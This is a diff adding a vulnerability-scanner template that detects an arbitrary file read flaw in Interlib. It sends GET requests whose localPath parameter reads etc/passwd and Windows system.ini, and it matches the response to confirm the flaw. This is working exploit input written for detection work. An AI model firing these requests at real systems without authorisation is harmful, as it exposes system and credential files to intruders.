@@ -1,0 +1,29 @@
+id: interlib-fileread
+brief:
+    title: Interlib - Local File Inclusion
+    by: pikpikcu
+    level: high
+    about: Interlib has an arbitrary file read vulnerability. Attackers can use the vulnerability to read any file.
+    label:
+        - interlib
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/interlib/report/ShowImage?localPath=etc/passwd'
+        - '{{BaseURL}}/interlib/report/ShowImage?localPath=C:\Windows\system.ini'
+      signs:
+        - "on": word
+          has:
+            - for 16-bit app support
+          in: body
+        - "on": word
+          has:
+            - image/jpg
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
